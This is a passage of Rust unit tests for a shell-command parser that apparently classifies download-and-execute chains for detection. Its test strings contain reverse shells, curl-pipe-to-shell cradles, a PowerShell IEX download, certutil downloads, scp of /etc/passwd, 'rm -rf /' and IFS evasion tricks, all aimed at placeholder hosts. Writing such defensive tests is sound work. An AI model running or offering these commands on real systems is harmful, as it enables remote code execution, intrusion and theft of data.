        let long = format!("http://example.org/{}", "a".repeat(MAX_VALUE));
        let x = read(&format!(
            "cd /tmp; wget {long} -O /tmp/a; /tmp/a tag; wget http://example.org/b; rm x"
        ));
        assert_eq!(x.opaque.len(), 1);
        assert!(over_limit(&x));
        assert_eq!(x.opaque[0].at.layer, 0);
        let found = steps(&only(&x).nodes);
        assert_eq!(found.len(), 5, "{found:?}");
        assert_eq!(fetch(&x, found[1]).1, long);
        assert_eq!(*found[2], run("/tmp/a", Some("tag")));
        assert_eq!(fetch(&x, found[3]).1, "http://example.org/b");
        assert_eq!(*found[4], Step::Cleanup);
        // The other URL of the same command is kept.
        let x = read(&format!("wget {long} http://example.org/b"));
        assert_eq!(steps(&only(&x).nodes).len(), 2);
    }

    #[test]
    fn option_values_of_data_are_not_targets() {
        for opt in [
            "--data-binary",
            "--data-raw",
            "--data-urlencode",
            "--form",
            "--cookie",
        ] {
            let x = read(&format!("curl {opt} 'a=b.c/d' http://example.org/x"));
            let found = steps(&only(&x).nodes);
            assert_eq!(found.len(), 1, "{opt}: {found:?}");
            assert_eq!(fetch(&x, found[0]).1, "http://example.org/x");
        }
        let x = read("wget --post-data 'a=b.c/d' --post-file /tmp/f http://example.org/x");
        assert_eq!(steps(&only(&x).nodes).len(), 1);
    }

    #[test]
    fn other_fetchers_are_read() {
        let targets = |line: &str| -> Vec<(String, bool)> {
            let x = read(line);
            let mut all = Vec::new();
            for recipe in &x.recipes {
                for step in steps(&recipe.nodes) {
                    if let Step::Fetch { .. } = step {
                        let (_, url, saves) = fetch(&x, step);
                        all.push((url, saves));
                    }
                }
            }
            all
        };
        let one = |url: &str, saves: bool| vec![(url.to_string(), saves)];
        let py = "python3 -c \"import urllib.request as u; exec(u.urlopen('http://example.org/x').read())\"";
        assert_eq!(targets(py), one("http://example.org/x", true));
        let py = "python -c \"import requests; print(requests.get('http://example.org/x').text)\"";
        assert_eq!(targets(py), one("http://example.org/x", false));
        let py = "python -c \"print('http://example.org/x')\"";
        assert_eq!(targets(py), []);
        let pl = "perl -MLWP::Simple -e 'getstore(\"http://example.org/x\",\"/tmp/y\")'";
        assert_eq!(targets(pl), one("http://example.org/x", true));
        assert_eq!(
            targets("cat </dev/tcp/203.0.113.9/80 | sh"),
            one("203.0.113.9", true)
        );
        assert_eq!(
            targets("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"),
            one("203.0.113.9", false)
        );
        assert_eq!(
            targets("nc -w 3 203.0.113.9 4444 | sh"),
            one("203.0.113.9", true)
        );
        assert_eq!(
            targets("nc 203.0.113.9 4444 > /tmp/x"),
            one("203.0.113.9", true)
        );
        assert_eq!(targets("nc -lvp 4444 | sh"), []);
        assert_eq!(
            targets("certutil.exe -urlcache -split -f http://example.org/a.exe a.exe"),
            one("http://example.org/a.exe", true)
        );
        let ps = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.org/a.ps1')\"";
        assert_eq!(targets(ps), one("http://example.org/a.ps1", true));
        let ps =
            "powershell -c \"(New-Object Net.WebClient).DownloadString('http://example.org/a')\"";
        assert_eq!(targets(ps), one("http://example.org/a", false));
    }

    #[test]
    fn no_step_keeps_a_word_inside_a_key() {
        let line = "abcdefghijkl";
        let text = format!(
            "foo -----BEGIN X PRIVATE KEY-----\n{line}\nsh /tmp/{line} {line}\n\
             -----END X PRIVATE KEY-----\n/tmp/x tag"
        );
        let x = read(&text);
        let recipe = only(&x);
        assert!(!format!("{:?}", recipe).contains(line), "{recipe:?}");
        assert_eq!(
            *steps(&recipe.nodes).last().unwrap(),
            &run("/tmp/x", Some("tag"))
        );
    }

    #[test]
    fn saves_needs_a_pipe_a_file_or_a_later_run() {
        let saved = |line: &str| fetches_saved(&read(line));
        // Only queried.
        assert_eq!(saved("curl -s http://198.51.100.1/latest/; rm x"), [false]);
        assert_eq!(saved("wget -qO- http://198.51.100.1/x | grep a"), [false]);
        assert_eq!(saved("wget -O /dev/null http://example.org/x"), [false]);
        assert_eq!(
            saved("curl http://example.org/x > /dev/null 2>/tmp/err"),
            [false]
        );
        assert_eq!(saved("wget --spider http://example.org/x; ./y"), [false]);
        assert_eq!(saved("wget -O- http://example.org/x | grep a"), [false]);
        // Written.
        assert_eq!(
            saved("cd /var/www/html; wget http://example.org/s.php"),
            [true]
        );
        assert_eq!(saved("wget http://example.org/x; ./y"), [true]);
        assert_eq!(saved("wget -O /tmp/a http://example.org/x"), [true]);
        assert_eq!(saved("wget -qO/tmp/a http://example.org/x"), [true]);
        assert_eq!(
            saved("wget --output-document=/tmp/a http://example.org/x"),
            [true]
        );
        assert_eq!(saved("curl -sSLo /tmp/a http://example.org/x"), [true]);
        assert_eq!(saved("curl -O http://example.org/x"), [true]);
        assert_eq!(saved("curl http://example.org/x > /tmp/a"), [true]);
        assert_eq!(saved("curl http://example.org/x >> /tmp/a"), [true]);
        assert_eq!(saved("(curl http://example.org/x) > /tmp/a"), [true]);
        assert_eq!(saved("tftp -g -r x 192.0.2.1"), [true]);
        // Piped to a shell.
        assert_eq!(
            saved("curl http://example.org/x | base64 -d | bash"),
            [true]
        );
        assert_eq!(saved("{ curl http://example.org/x; } | sh"), [true]);
        // Later run.
        assert_eq!(saved("wget http://example.org/x; ./x"), [true]);
        assert_eq!(saved("wget http://example.org/x?a=1; sh /tmp/x"), [true]);
        assert_eq!(saved("cd /tmp\nwget http://example.org/x\nsh x t"), [true]);
        assert_eq!(saved("busybox wget http://example.org/x && ./x"), [true]);
        // Upload, not a fetch.
        assert_eq!(
            steps(&read("scp /etc/passwd u@example.org:/x; ./y").recipes[0].nodes)[0],
            &Step::Other("scp".to_string())
        );
    }

    #[test]
    fn option_values_are_not_targets() {
        let x = read(
            "wget -U Mozilla/5.0 --header 'X: y' http://example.org/a -O /tmp/a; \
             curl -A a/b -H 'X: y' -sk http://example.org/b -o /tmp/b; \
             wget --no-check-certificate 192.0.2.1:8088/c -O /tmp/c",
        );
        let found = steps(&only(&x).nodes);
        let targets: Vec<_> = found.iter().map(|s| fetch(&x, s).1).collect();
        assert_eq!(
            targets,
            [
                "http://example.org/a",
                "http://example.org/b",
                "192.0.2.1:8088/c"
            ]
        );
    }

    #[test]
    fn or_is_a_try_and_and_is_a_sequence() {
        let x = read("wget http://example.org/a && sh a || curl http://example.org/b | sh");
        let [Node::Try { first, fallback }] = only(&x).nodes.as_slice() else {
            panic!("{:?}", only(&x).nodes);
        };
        assert_eq!(first.len(), 2);
        assert!(matches!(fallback.as_slice(), [Node::Pipe(_)]));
    }

    #[test]
    fn if_without_else_and_elif_are_branches() {
        let x = read("if [ -f /a ]; then ./a; fi");
        let [Node::Try { first, fallback }] = only(&x).nodes.as_slice() else {
            panic!("{:?}", only(&x).nodes);
        };
        assert_eq!(first.len(), 1);
        assert!(fallback.is_empty());

        let x = read(
            "if which wget; then wget http://example.org/a; \
             elif which curl; then curl -O http://example.org/a; \
             else tftp -g -r a 192.0.2.1; fi; ./a tag",
        );
        let [Node::Try { fallback, .. }, Node::Step(last)] = only(&x).nodes.as_slice() else {
            panic!("{:?}", only(&x).nodes);
        };
        assert!(matches!(fallback.as_slice(), [Node::Try { .. }]));
        assert_eq!(*last, run("./a", Some("tag")));
        assert_eq!(fetches_saved(&x), [true, true, true]);
    }

    #[test]
    fn a_failed_status_test_does_not_join_the_fetch_to_the_branch() {
        for test in ["$? -ne 0", "$? != 0", "$? -gt 0", "$? -eq 1"] {
            let x = read(&format!(
                "scp u@example.org:/a a; if [ {test} ]; then ./b; fi"
            ));
            assert!(
                matches!(
                    only(&x).nodes.as_slice(),
                    [Node::Step(Step::Fetch { .. }), Node::Try { .. }]
                ),
                "{test}"
            );
        }
    }

    #[test]
    fn loops_read_their_bodies() {
        let x =
            read("for a in arm mips; do wget http://example.org/$a; chmod +x $a; ./$a tag; done");
        let found = steps(&only(&x).nodes);
        assert_eq!(*found[0], Step::Other("for".to_string()));
        assert_eq!(fetch(&x, found[1]).2, true);
        assert_eq!(*found[2], Step::Arm);
        assert_eq!(*found[3], run("./$a", Some("tag")));
    }

    #[test]
    fn newlines_comments_and_continuations() {
        let x = read(
            "# a comment; wget http://example.org/no\n\
             cd /tmp # another\n\
             wget http://example.org/a#b \\\n  -O /tmp/a |\n\n  sh\n",
        );
        let found = steps(&only(&x).nodes);
        assert_eq!(found.len(), 3);
        assert_eq!(fetch(&x, found[1]).1, "http://example.org/a#b");
    }

    #[test]
    fn heredoc_is_data_not_commands() {
        let x = read(
            "cat > /tmp/k <<'EOF'\nwget http://example.org/no\nrm -rf /\nEOF\nchmod 600 /tmp/k\n\
             cat <<-END > /tmp/j\n\tline\n\tEND\nsh /tmp/j\n",
        );
        let found = steps(&only(&x).nodes);
        assert_eq!(found.len(), 4);
        let Step::Write(Some(body)) = found[0] else {
            panic!("{:?}", found[0]);
        };
        assert_eq!(text(&x, *body), "wget http://example.org/no\nrm -rf /\n");
        assert!(matches!(found[2], Step::Write(Some(_))));
        // Unterminated: the rest of the text is the body.
        let x = read("cat > /tmp/k <<EOF\nwget http://example.org/no\n");
        assert_eq!(steps(&only(&x).nodes).len(), 1);
    }

    #[test]
    fn key_text_is_never_kept_as_a_step() {
        let line = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
        let slash = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
        // A pasted PEM block: reading stops at its marker.
        let x = read(&format!(
            "./x tag\n-----BEGIN OPENSSH PRIVATE KEY-----\n{slash}\n{line}\n"
        ));
        assert_eq!(steps(&only(&x).nodes), [&run("./x", Some("tag"))]);
        assert_eq!(x.opaque, []);
        // Bare lines stay out of `Other` and `normal`.
        let x = read(&format!("./x tag\n{line}\n"));
        assert!(!format!("{:?}", x.recipes).contains(line));
        // A key written by a heredoc or a quoted argument is only a span.
        let x = read(&format!(
            "cat > k <<E\n{slash}\n{line}\nE\necho '{line}' >> k"
        ));
        assert!(!format!("{:?}", x.recipes).contains(line));
        assert!(!format!("{:?}", x.recipes).contains(slash));
    }

    #[test]
    fn plain_text_is_no_recipe() {
        for body in [
            "hello world, this is text",
            "set the value; export it\nmake it so",
            "<html><body>a</body></html>",
            "wget is a tool",
            "a=1&b=2",
            "",
        ] {
            assert_eq!(read(body).recipes, [], "{body}");
        }
        let mut x = Xray::new(&b"word another\n".repeat(400));
        let mut budget = Budget::default();
        read_recipes(&mut x, 0, &mut budget, &[]);
        assert_eq!(budget.steps, MAX_STEPS, "nothing kept, nothing spent");
        assert!(over_limit(&x), "reading still stopped, so it says so");
    }

    #[test]
    fn unterminated_text_is_total() {
        for body in [
            "wget 'http://example.org/x",
            "wget \"http://example.org/x",
            "echo $(wget http://example.org/x",
            "echo `wget http://example.org/x",
            "echo ${x",
            "sh \\",
            "sh >",
            "sh 2>",
            "cat <<",
            "if",
            "if a; then",
            "else",
            "fi",
            ")",
            "}",
            "|",
            "||",
            "&&",
            ";",
            "| sh",
            "|| sh",
            "(",
            "(((|",
        ] {
            read(body);
        }
    }

    #[test]
    fn long_normal_form_is_cut_and_marked() {
        let x = read(&format!(
            "wget http://example.org/x; {}./x",
            "cd /tmp; ".repeat(100)
        ));
        assert!(only(&x).normal.len() <= MAX_VALUE);
        assert!(over_limit(&x));
    }

    #[test]
    fn binary_bytes_are_total() {
        let x = read_bytes(b"\xff\xfe /tmp/\xff\xfe \xff\xfd; wget \xff://x.y/\xfe");
        assert!(x.recipes.len() <= 1);
    }

    #[test]
    fn seeded_noise_is_total_and_bounded() {
        let mut state = 0x9e37_79b9_7f4a_7c15u64;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        let alphabet: &[&[u8]] = &[
            b";",
            b"&",
            b"&&",
            b"||",
            b"|",
            b"(",
            b")",
            b"$(",
            b"`",
            b"'",
            b"\"",
            b"\\",
            b"\n",
            b" ",
            b" ",
            b" ",
            b">",
            b"<",
            b"<<E\n",
            b"E\n",
            b"2>&1",
            b"if ",
            b"then ",
            b"else ",
            b"elif ",
            b"fi ",
            b"{ ",
            b"} ",
            b"do ",
            b"done ",
            b"wget ",
            b"curl -O ",
            b"scp ",
            b"sh ",
            b"sh -s ",
            b"./x ",
            b"chmod +x ",
            b"rm ",
            b"echo ",
            b"a.b/c",
            b"$x",
            b"${y}",
            b"#",
            b"-O",
            b"\xff",
        ];
        for _ in 0..2000 {
            let len = (next() % 200) as usize;
            let body: Vec<u8> = (0..len)
                .flat_map(|_| {
                    alphabet[(next() >> 16) as usize % alphabet.len()]
                        .iter()
                        .copied()
                })
                .collect();
            let x = read_bytes(&body);
            assert!(x.layers.len() <= MAX_LAYERS);
            for recipe in &x.recipes {
                assert!(steps(&recipe.nodes).len() <= MAX_STEPS);
                assert!(recipe.normal.len() <= MAX_VALUE);
                assert!(recipe.layer < x.layers.len());
                for step in steps(&recipe.nodes) {
                    if let Step::Fetch { target: at, .. } | Step::Write(Some(at)) = step {
                        assert!(at.start <= at.end && at.end <= x.layers[at.layer].text.len());
                    }
                }
            }
            for layer in &x.layers {
                if let Some(from) = layer.from {
                    assert!(from.start <= from.end);
                    assert!(from.end <= x.layers[from.layer].text.len());
                }
            }
        }
    }

    #[test]
    fn a_full_layer_list_is_noted_once() {
        let body: String = (0..1000).map(|i| format!("$(id {i})")).collect();
        let x = read(&body);
        assert_eq!(x.layers.len(), MAX_LAYERS);
        assert_eq!(x.opaque.len(), 1);
        assert!(over_limit(&x));
    }

    fn shell_layers(x: &Xray) -> Vec<&[u8]> {
        x.layers
            .iter()
            .filter(|l| l.kind == LayerKind::Shell)
            .map(|l| l.text.as_slice())
            .collect()
    }

    /// `saves` of every fetch in every recipe, in recipe order.
    fn all_saved(x: &Xray) -> Vec<bool> {
        x.recipes
            .iter()
            .flat_map(|r| steps(&r.nodes))
            .filter(|s| matches!(s, Step::Fetch { .. }))
            .map(|s| fetch(x, s).2)
            .collect()
    }

    #[test]
    fn inline_scripts_open_as_shell_layers() {
        const SCRIPT: &[u8] = b"wget http://example.org/a -O /tmp/a; sh /tmp/a tag";
        for line in [
            "sh -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "sh -c \"wget http://example.org/a -O /tmp/a; sh /tmp/a tag\"",
            "bash -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "/bin/bash -ec 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "nohup sh -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag' &",
            "eval 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "eval \"wget http://example.org/a -O /tmp/a; sh /tmp/a tag\"",
            "bash -o pipefail -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "sh -e -o x -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "bash -eo pipefail -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
            "bash +o history -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
        ] {
            let x = read(line);
            assert_eq!(shell_layers(&x), [SCRIPT], "{line}");
            let child = &x.layers[1];
            assert_eq!(child.parent, Some(0));
            let from = child.from.unwrap();
            assert_eq!(&x.layers[0].text[from.start..from.end], SCRIPT, "{line}");
            let inner = x.recipes.iter().find(|r| r.layer == 1).expect(line);
            let found = steps(&inner.nodes);
            assert_eq!(fetch(&x, found[0]).1, "http://example.org/a", "{line}");
            assert_eq!(*found[1], run("/tmp/a", Some("tag")), "{line}");
            assert_eq!(all_saved(&x), [true], "{line}");
        }
        // Escapes are gone from the layer's text, as the shell would read it.
        let x = read(r#"sh -c "wget \"http://example.org/a\" -O /tmp/a""#);
        assert_eq!(
            shell_layers(&x),
            [&b"wget \"http://example.org/a\" -O /tmp/a"[..]]
        );
        // Bare words count too; `eval` joins them.
        let x = read("eval wget -O /tmp/a http://example.org/a");
        assert_eq!(
            shell_layers(&x),
            [&b"wget -O /tmp/a http://example.org/a"[..]]
        );
        assert_eq!(all_saved(&x), [true]);
        // An `eval` of something is a run; prose is neither run nor recipe.
        assert_eq!(
            steps(&read("eval 'id'").recipes[0].nodes),
            [&run("eval", None)]
        );
        assert_eq!(read("eval is not a word here").recipes, []);
        assert_eq!(read("perl -e 'wget http://example.org/a'").layers.len(), 1);
    }

    #[test]
    fn nested_inline_scripts_stop_at_the_depth_limit() {
        let x = read(&format!("{}wget http://example.org/x", "eval ".repeat(20)));
        assert_eq!(x.layers.len(), MAX_DEPTH + 1, "raw plus 6");
        assert!(too_deep(&x));
    }

    #[test]
    fn output_of_a_substitution_run_as_code_saves_the_fetch() {
        for line in [
            "sh -c \"$(curl -fsSL http://example.org/x)\"",
            "bash -c \"$(wget -qO- http://example.org/x)\"",
            "sh -c \"`curl -s http://example.org/x`\"",
            "eval \"$(wget -qO- http://example.org/x)\"",
            "eval $(curl -s http://example.org/x)",
            "eval `curl -s http://example.org/x`",
            "$(curl -s http://example.org/x)",
            "`curl -s http://example.org/x`",
            // Not the whole script, but in command position.
            "sh -c \"cd /tmp; $(curl -s http://example.org/x)\"",
            "sh -c \"$(curl -s http://example.org/x) arg\"",
            // Process substitution and here-strings.
            "bash <(curl -s http://example.org/x)",
            ". <(wget -qO- http://example.org/x)",
            "source <(curl -s http://example.org/x)",
            "sh < <(curl -s http://example.org/x)",
            "sh <<< \"$(curl -s http://example.org/x)\"",
            "bash <<< `curl -s http://example.org/x`",
            "source <<< \"$(curl -s http://example.org/x)\"",
            // Printed into a shell.
            "echo $(curl -s http://example.org/x) | sh",
            "printf '%s' \"$(curl -s http://example.org/x)\" | sh",
            "echo \"$(curl -s http://example.org/x)\" | base64 -d | bash",
            "cat <(curl -s http://example.org/x) | sh",
            "(echo $(curl -s http://example.org/x)) | sh",
            "{ echo a; echo $(curl -s http://example.org/x); } | python3",
        ] {
            assert_eq!(all_saved(&read(line)), [true], "{line}");
        }
        // Run after the same text was opened elsewhere.
        let x = read(
            "echo $(curl -s http://example.org/x); \
             sh -c \"$(curl -s http://example.org/x)\"",
        );
        assert_eq!(all_saved(&x), [true]);
        let x = read(
            "echo $(curl -s http://example.org/x); \
             echo $(sh -c \"$(curl -s http://example.org/x)\")",
        );
        assert_eq!(all_saved(&x), [true]);
        // Empty substitutions print nothing, and are no layer to find.
        let x = read("curl http://example.org/x; $()");
        assert_eq!(all_saved(&x), [false]);
        // The output goes somewhere that is no shell.
        for line in [
            "echo $(curl -s http://example.org/x)",
            "a=$(curl -s http://example.org/x)",
            "sh -c \"echo $(curl -s http://example.org/x)\"",
            "eval \"echo $(curl -s http://example.org/x)\"",
            "cat <(curl -s http://example.org/x)",
            "echo $(curl -s http://example.org/x) | grep a",
            "echo $(curl -s http://example.org/x); sh",
            "echo $(curl -s http://example.org/x) | sh /tmp/a",
            "echo $(curl -s http://example.org/x) && a | sh",
            "sh /tmp/a <<< \"$(curl -s http://example.org/x)\"",
            "grep a <<< \"$(curl -s http://example.org/x)\"",
        ] {
            assert_eq!(all_saved(&read(line)), [false], "{line}");
        }
    }

    #[test]
    fn stdin_of_a_shell_is_code() {
        let x = read("bash <(curl -s http://example.org/x) apache");
        let parent = steps(&x.recipes[0].nodes);
        assert_eq!(parent, [&run("bash", Some("apache"))]);
        // A here-string holds the code itself, and only shells read it so.
        let x = read("sh <<< 'wget -qO- http://example.org/x | sh'");
        assert_eq!(
            shell_layers(&x),
            [&b"wget -qO- http://example.org/x | sh"[..]]
        );
        assert_eq!(all_saved(&x), [true]);
        assert_eq!(
            shell_layers(&read("python3 <<< 'wget http://example.org/x'")),
            [&[] as &[u8]; 0]
        );
        // A file on stdin is a run of that file.
        assert_eq!(
            all_saved(&read("wget http://example.org/x; sh < x")),
            [true]
        );
        // Only stdin counts: not another descriptor.
        assert_eq!(
            all_saved(&read("wget --spider http://example.org/x; sh 3< x")),
            [false]
        );
    }

    #[test]
    fn ifs_is_a_blank() {
        for line in [
            "wget${IFS}http://example.org/x${IFS}-O${IFS}/tmp/x;sh${IFS}/tmp/x${IFS}tag",
            "wget$IFS'http://example.org/x'$IFS-O$IFS/tmp/x;sh$IFS/tmp/x$IFS'tag'",
            "wget${IFS%??}http://example.org/x${IFS%??}-O${IFS%??}/tmp/x;sh${IFS%??}/tmp/x${IFS%??}tag",
            "wget$IFS$9http://example.org/x$IFS$9-O$IFS$9/tmp/x;sh$IFS$9/tmp/x$IFS$9tag",
            "wget${IFS}$9http://example.org/x ${IFS} -O /tmp/x;${IFS}sh /tmp/x tag",
            "sh -c 'wget${IFS}http://example.org/x${IFS}-O${IFS}/tmp/x;sh${IFS}/tmp/x${IFS}tag'",
        ] {
            let x = read(line);
            let inner = x.recipes.last().expect(line);
            let found = steps(&inner.nodes);
            assert_eq!(fetch(&x, found[0]).1, "http://example.org/x", "{line}");
            assert_eq!(*found[1], run("/tmp/x", Some("tag")), "{line}");
            assert_eq!(all_saved(&x), [true], "{line}");
        }
        // Other variables stay in their word, and quotes keep it whole.
        let x = read("wget http://example.org/$IFSX -O /tmp/x; ./$IFSX");
        assert_eq!(
            fetch(&x, steps(&only(&x).nodes)[0]).1,
            "http://example.org/$IFSX"
        );
        let x = read("wget \"http://example.org/${IFS}x\" -O /tmp/x");
        assert_eq!(
            fetch(&x, steps(&only(&x).nodes)[0]).1,
            "http://example.org/${IFS}x"
        );
        // Cut text ends the word; it does not loop.
        for body in ["$IFS", "${IFS", "${IFS%", "wget${IFS", "$IFS$", "$IFS$9"] {
            read(body);
        }
    }

    #[test]
    fn heredoc_to_a_shell_is_read_as_shell() {
        const SCRIPT: &[u8] = b"cd /tmp\nwget -qO- http://example.org/x | sh -s apache\n";
        let body = String::from_utf8_lossy(SCRIPT);
        for line in [
            format!("sh <<EOF\n{body}EOF\n"),
            format!("bash <<'EOF'\n{body}EOF\n"),
            format!("sh -s t <<-EOF\n{body}EOF\n"),
            format!("/bin/sh << EOF\n{body}EOF\nrm x\n"),
            format!("cat <<EOF | sh\n{body}EOF\n"),
            format!("sh <<EOF\n{body}"),
            // The newline the body waits for is behind other commands.
            format!("sh <<EOF &\n{body}EOF\n"),
            format!("nohup sh <<EOF && rm x\n{body}EOF\n"),
            format!("sh <<EOF | tee /tmp/l\n{body}EOF\n"),
        ] {
            let x = read(&line);
            assert_eq!(shell_layers(&x), [SCRIPT], "{line}");
            let inner = x.recipes.iter().find(|r| r.layer == 1).expect(&line);
            assert!(
                steps(&inner.nodes).contains(&&run("sh", Some("apache"))),
                "{line}"
            );
            assert_eq!(all_saved(&x), [true], "{line}");
            let from = x.layers[1].from.unwrap();
            assert_eq!(&x.layers[0].text[from.start..from.end], SCRIPT, "{line}");
        }
        // Handed to anything else it stays data.
        for line in [
            format!("cat > /tmp/k <<EOF\n{body}EOF\n"),
            format!("sh /tmp/a <<EOF\n{body}EOF\n"),
            format!("python3 <<EOF\n{body}EOF\n"),
        ] {
            assert_eq!(shell_layers(&read(&line)), [&[] as &[u8]; 0], "{line}");
        }
    }

    #[test]
    fn key_text_stays_out_of_steps_in_a_heredoc_to_a_shell() {
        let line = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
        let slash = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
        let split = "/tmp/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt";
        let parts = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUA/AAAEbm9uZQAAAAAAAAABAAAAMwAAAAt";
        for body in [
            // Written by a heredoc inside the heredoc.
            format!("cat > /tmp/k <<K\n{slash}\n{line}\nK\nscp -i /tmp/k u@example.org:/a a\n"),
            // A pasted block: reading stops at the marker.
            format!("./x t\n-----BEGIN OPENSSH PRIVATE KEY-----\n{slash}\n{line}\n"),
            // Lines with no marker at all are no commands to keep.
            format!("./x t\n{slash}\n{line}\n{split}\n{parts}\n"),
            // Quoted, it is only a span.
            format!("echo \"{slash}\" >> /tmp/k; echo \"{line}\" >> /tmp/k; sh /tmp/k\n"),
        ] {
            for wrapped in [format!("sh <<EOF\n{body}EOF\n"), format!("eval '{body}'")] {
                let x = read(&wrapped);
                assert!(!x.recipes.is_empty(), "{wrapped}");
                let kept = format!("{:?}", x.recipes);
                for key in [line, slash, split, parts] {
                    assert!(!kept.contains(key), "{wrapped}");
                }
            }
        }
    }

    #[test]
    fn a_payload_may_share_a_name_with_a_tool() {
        let x = read("wget http://example.org/sh; chmod +x sh; ./sh tag");
        let found = steps(&only(&x).nodes);
        assert_eq!(*found[2], run("./sh", Some("tag")));
        assert_eq!(fetches_saved(&x), [true]);
    }

    #[test]
    fn payload_paths_look_like_paths() {
        for path in [
            "/tmp/x",
            "/var/tmp/x",
            "/dev/shm/x",
            "/root/x",
            "/home/a/x",
            "/mnt/x",
            "/opt/x",
            "/run/x",
            "./x",
            "../x",
            "/data/x.sh",
            "/tmp/out_sh",
            "./out_sh",
            "~/.x",
        ] {
            assert_eq!(
                steps(&only(&read(path)).nodes),
                [&run(path, None)],
                "{path}"
            );
        }
        let long = format!("/tmp/{}", "a/".repeat(70));
        for path in [
            "/data/x",
            "/tmpx/y",
            "~/x",
            "/usr/bin/id",
            "/tmp/a+b",
            "/tmp/a=",
            long.as_str(),
        ] {
            assert_eq!(read(path).recipes, [], "{path}");
        }
    }

    #[test]
    fn interpreters_need_a_file_or_a_pipe() {
        for body in ["python is a language", "source code here", "history of it"] {
            assert_eq!(read(body).recipes, [], "{body}");
        }
        for (line, step) in [
            ("python3 /tmp/x.py t", run("/tmp/x.py", Some("t"))),
            ("perl -e 'print 1'", run("perl", None)),
            ("curl http://example.org/x | python3", run("python3", None)),
            (". ./env.sh", run("./env.sh", None)),
            ("history -c", Step::Cleanup),
        ] {
            let x = read(line);
            let found = steps(&only(&x).nodes);
            assert_eq!(found.last(), Some(&&step), "{line}");
        }
    }
}
